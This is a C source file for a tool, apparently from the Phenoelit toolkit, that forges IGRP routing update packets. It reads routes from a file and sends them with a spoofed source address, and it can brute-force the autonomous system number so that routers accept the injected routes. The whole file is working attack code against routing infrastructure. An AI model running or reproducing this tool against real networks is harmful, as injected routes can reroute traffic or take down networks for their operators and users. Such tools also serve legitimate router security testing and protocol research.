/* IGRP 
 *
 * FX <fx@phenoelit.de>
 * Phenoelit (http://www.phenoelit.de)
 * (c) 2k
 *
 * $Id: igrp.c,v 1.10 2000/09/26 09:21:06 fx Exp $
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netinet/in.h>
#include <rpc/types.h>
#include <netdb.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <errno.h>
#include <math.h>

#include <sys/ioctl.h>
#include <netinet/in.h>                 /* for IPPROTO_bla consts */
#include <netpacket/packet.h>
#include <net/ethernet.h>               /* to get my own ETH addr */
#include <net/if.h>


#include "protocols.h"
#include "packets.h"


/* definitions */
#define MAX_ROUTES	1000
#define MAX_LINE	256
#define DELIMITER	':'

#define IP_ADDR_LEN	4
#define IP_IGRP_TTL	0x80
#define IPPROTO_IGRP	0x09
#define IP_BCAST	"255.255.255.255"

/* config */
struct {
    int			verbose;
    char		*device;

    char		*routesfile;

    int			autosys;
    int			asysbf;

    int			spoof_src;
    struct in_addr	src;
    int			set_dest;
    struct in_addr	dest;

} cfg;

/************************************
 * globals */
u_char			*rawpacket;
int			atsock;

igrp_system_entry_t	routes[MAX_ROUTES];
int			routesc;


/************************************
 * prototypes */
void	usage(char *n);
void	send_table(int autosys);

/* routes management */
int	read_routing_table(char *fname);
void	print_routing_table(void);

/* IGRP construction */
u_char	*construct_igrp(int from, int to, u_int16_t autosys, int *psize);


/* the main function */
int	main(int argc, char **argv) {
    char		option;
    extern char		*optarg;
    int			bruteforce;


    memset(&cfg,0,sizeof(cfg));
    while ((option=getopt(argc,argv,"vi:f:a:b:S:D:"))!=EOF) {
	switch (option) {
	    case 'v':	/* verbose */
			cfg.verbose++;
			break;
	    case 'i':	/* local network device */
			cfg.device=smalloc(strlen(optarg)+1);
			strcpy(cfg.device,optarg);
			break;
	    case 'f':	/* routes file */
			cfg.routesfile=smalloc(strlen(optarg)+1);
			strcpy(cfg.routesfile,optarg);
			break;
	    case 'a':	/* autonomous system */
			cfg.autosys=atoi(optarg);
			break;
	    case 'b':	/* brute force autonomous system */
			cfg.asysbf=atoi(optarg);
			break;
	    case 'S':	/* spoof source */
			if (inet_aton(optarg,&(cfg.src))==0) {
			    fprintf(stderr,
				    "source IP address seems to be wrong\n");
			    return (1);
			}
			cfg.spoof_src++;
			break;
	    case 'D':	/* set destination */
			if (inet_aton(optarg,&(cfg.dest))==0) {
			    fprintf(stderr,
				    "dest. IP address seems to be wrong\n");
			    return (1);
			}
			cfg.set_dest++;
			break;
	    default:	usage(argv[0]);
	}
    }

    if (!(cfg.device&&cfg.routesfile)) usage(argv[0]);
    if ((cfg.autosys==0)&&(cfg.asysbf==0)) 
	fprintf(stderr,"WARNING: running with autonomous system # = 0\n");
    if (read_routing_table(cfg.routesfile)!=0) return (1);

    if (cfg.verbose)
	print_routing_table();

    /* set up socket ... */
    if ((atsock=init_socket_IP4(cfg.device,1))==(-1)) return(1);
    /* if spoofing is enabled, copy it */
    if (!cfg.spoof_src) {
	memcpy(&(cfg.src.s_addr), &(packet_ifconfig.ip.s_addr), IP_ADDR_LEN);
    }

    if (!cfg.asysbf) {
	/* if brute force is not requested, just send the table */
	send_table(cfg.autosys);

    } else {
	/* brute force the autonomous system 
	 * beginning at cfg.autosys until cfg.asysbf */
	printf("Brute force from autonomous system # %d to %d",
		cfg.autosys,cfg.asysbf);

	for (bruteforce=cfg.autosys;
		bruteforce<=cfg.asysbf;
		bruteforce++) {

	    printf("."); fflush(stdout);
	    send_table(bruteforce);
	}

	printf("Done\n");
    }


    /* at the end of the day, close our socket */
    close(atsock);

    return (0);
}




/********************** FUNCTIONS **********************/

void	send_table(int autosys) {
    int			plength;
    int			i;
    int			rtsize;


    /* check the size of the routing table ... */
    if ( (sizeof(igrp_system_entry_t)*routesc
	     +sizeof(igrp_t)
	     +sizeof(iphdr_t)
	     +sizeof(struct ether_header)) > /*MTU*/1500) {

	printf("Routing table size (%d octets) is to large for one packet\n"
		"Splitting up ...\n",
		sizeof(igrp_system_entry_t)*routesc);

	/* split up the table in chunks that can be send through eth */

	rtsize= (
		packet_ifconfig.mtu-sizeof(igrp_t)-sizeof(iphdr_t)
		-sizeof(struct ether_header)-1)
	    / sizeof(igrp_system_entry_t);

	if (cfg.verbose>1)
	    printf("\t%d routes per packet ...\n",rtsize);

	for (i=0;i<routesc;i+=rtsize) {
	    if ((rawpacket=
			construct_igrp(i,
			    (i+rtsize)>routesc?routesc:i+rtsize,
			    autosys,&plength))!=NULL) {
		if (cfg.verbose)
		    printf("Packet sized %d octets is ready for delivery ...\n",
			    plength);
		sendpack_IP4(atsock,rawpacket,plength);
		free(rawpacket);
	    }
	} /* end of for */

    } else {

	/* Routing table fits in one update packet */
	if ((rawpacket=
		    construct_igrp(0,routesc,autosys,&plength))!=NULL) {
	    if (cfg.verbose)
		printf("Packet sized %d octets is ready for delivery ...\n",
			plength);
	    sendpack_IP4(atsock,rawpacket,plength);
	    free(rawpacket);
	}
    }

}


/* constructs the IGRP update packet
 * * Returns a pointer to the packet or NULL if failed
 * * returns also the size in *psize */
u_char	*construct_igrp(int from, int to, u_int16_t autosys, int *psize) {
    u_char			*tpacket;
    iphdr_t			*iph;
    igrp_t			*igrph;
    igrp_system_entry_t 	*sysh;
    u_int16_t			cs;		/* checksum */
    int				i;		/* routes counter */

    /* check what is called */
    if (to>routesc) {
	fprintf(stderr,"Internal error: construct_igrp() called with "
		"out-of-range 'to'\n");
	return NULL;
    }
    if ((to-from)<=0) {
	fprintf(stderr,"Internal error: construct_igrp() called with "
		"'from' > 'to'\n");
	return NULL;
    }

    *psize=sizeof(igrp_system_entry_t)*(to-from)+
	sizeof(igrp_t)+sizeof(iphdr_t);
    tpacket=(u_char *)smalloc(sizeof(igrp_system_entry_t)*(to-from)+
	    sizeof(igrp_t)+sizeof(iphdr_t)
	    +3 /* for my checksum function, which sometimes 
		  steps over the mark */
	    );

    /* make up IP packet */
    iph=(iphdr_t *)tpacket;

    iph->version=4;
    iph->ihl=sizeof(iphdr_t)/4;

    iph->tot_len=htons(*psize);
    iph->ttl=IP_IGRP_TTL;
    iph->protocol=IPPROTO_IGRP;

    memcpy(&(iph->saddr.s_addr),&(cfg.src.s_addr),IP_ADDR_LEN);

    if (cfg.set_dest) {
	memcpy(&(iph->daddr.s_addr),&(cfg.dest.s_addr),IP_ADDR_LEN);
    } else {
	inet_aton(IP_BCAST,&(iph->daddr));
    }

    /* make up the IGRP header */
    igrph=(igrp_t *)(tpacket+sizeof(iphdr_t));
    igrph->version=1;
    igrph->opcode=1;		/* Update */
    igrph->edition=0;
    igrph->autosys=htons(autosys);
    igrph->interior=0;
    igrph->system=htons(to-from);
    igrph->exterior=0;
    /* checksum is comupted later */

    for (i=from;i<to;i++) {
	sysh=(igrp_system_entry_t *)(tpacket
		+sizeof(iphdr_t)
		+sizeof(igrp_t)
		+(sizeof(igrp_system_entry_t)*(i-from)));

	memcpy(sysh,&(routes[i]),sizeof(igrp_system_entry_t));
    }

    /* make up checksum */
    cs=chksum((u_char *)igrph,(*psize-sizeof(iphdr_t)));
    igrph->checksum=cs;


    return tpacket;
}

/* reads the content of the routing table file
 * * returns 0 on success or -1 on error */
int	read_routing_table(char *fname) {

#define IP_DELIMITER	'.'
    
    FILE		*fd;
    char		*line,*lp,*lp2;

    struct in_addr	taddr;
    u_int32_t		lt;


    if ((fd=fopen(fname,"r"))==NULL) {
	perror("fopen");
	return (-1);
    }

    routesc=0;
    memset(&routes,0,sizeof(routes));
    /* This file format is as follows:
     *
     * destination:delay:bandwith:mtu:reliability:load:hopcount
     * 
     * To simplify things, the destination is 4 octets instead of three
     */

    line=smalloc(MAX_LINE);
    while (fgets(line,MAX_LINE-1,fd)!=NULL) {

	if (cfg.verbose>1) 
	    printf("%s",line);

	/* ignore comments */
	if (line[0]=='#') continue;
	/* check for table size */
	if (routesc>=MAX_ROUTES) {
	    fprintf(stderr,
		    "Entry '%s' not porcessed\nrouting table full\n",
		    line);
	    continue;
	}

	/* first, get the destination tripple */
	if ((lp=strchr(line,DELIMITER))==NULL) {
	    fprintf(stderr,"incomplete line in routing file (destination)\n");
	    return (-1);
	}
	lp[0]='\0'; lp++;			/* cut the string here */

	if (inet_aton(line,(struct in_addr *)&taddr)==0) {
	    fprintf(stderr,"incorrect destination\n");
	    return (-1);
	}
	/* copy the first three octets */
	memcpy((u_int8_t *)&(routes[routesc].destination[0]),
		(u_int8_t *)&(taddr.s_addr),3);

	/* get the delay */
	if ((lp2=strchr(lp,DELIMITER))==NULL) {
	    fprintf(stderr,"incomplete line in routing file (delay)\n");
	    return (-1);
	}
	lp2[0]='\0'; lp2++;
	// routes[routesc].delay=htonl(atol(lp));
	lt=htonl(atol(lp));
	memcpy(&(routes[routesc].delay),((u_int8_t *)&lt)+1,3);

	/* get the bandwith */
	if ((lp=strchr(lp2,DELIMITER))==NULL) {
	    fprintf(stderr,"incomplete line in routing file (bandwith)\n");
	    return (-1);
	}
	lp[0]='\0'; lp++;
	//routes[routesc].bandwith=htons(atol(lp2));
	lt=htonl(atol(lp2));
	memcpy(&(routes[routesc].bandwith),((u_int8_t *)&lt)+1,3);

	/* get MTU */
	if ((lp2=strchr(lp,DELIMITER))==NULL) {
	    fprintf(stderr,"incomplete line in routing file (MTU)\n");
	    return (-1);
	}
	lp2[0]='\0'; lp2++;
	routes[routesc].mtu=htons(atoi(lp));

	/* get reliability */
	if ((lp=strchr(lp2,DELIMITER))==NULL) {
	    fprintf(stderr,"incomplete line in routing file (reliability)\n");
	    return (-1);
	}
	lp[0]='\0'; lp++;
	routes[routesc].reliability=atoi(lp2);

	/* get load */
	if ((lp2=strchr(lp,DELIMITER))==NULL) {
	    fprintf(stderr,"incomplete line in routing file (load)\n");
	    return (-1);
	}
	lp2[0]='\0'; lp2++;
	routes[routesc].load=atoi(lp);

	/* get hopcount */
	if ((lp=strchr(lp2,'\n'))!=NULL) {	/* missing \n is ignored */
	    lp[0]='\0'; lp++;
	}
	routes[routesc].hopcount=atoi(lp2);

	/* declare this record as complete */
	routesc++;
	memset(line,0,MAX_LINE);
    }

    fclose(fd);
    return 0;
}

void	print_routing_table(void) {
    int		i;
    u_int32_t	lt=0,lt2=0;

    printf("Destination | Delay | Bandwith | "
	    " MTU  | Reliability | Load | Hop count\n");
    for (i=0;i<routesc;i++) {

	memcpy(((u_int8_t *)&lt)+1,&(routes[i].bandwith),3);
	memcpy(((u_int8_t *)&lt2)+1,&(routes[i].delay),3);

	printf("%03d.%03d.%03d | %5d | %8d | %5d | %11d | %4d | %9d \n",
		routes[i].destination[0],
		routes[i].destination[1],
		routes[i].destination[2],
		ntohl(lt2),
		ntohl(lt),
		ntohs(routes[i].mtu),
		routes[i].reliability,
		routes[i].load,
		routes[i].hopcount);
    }
}

void	usage(char *n) {
    printf(
	    "Usage: \n"
	    "%s [-v[v[v]]] -i <interface> -f <routes file> \n\t"
	    "-a <autonomous system> [-b brute force end]\n\t"
	    "[-S <spoofed source IP>] [-D <destination ip>]\n",
	    n);
    exit (1);
}
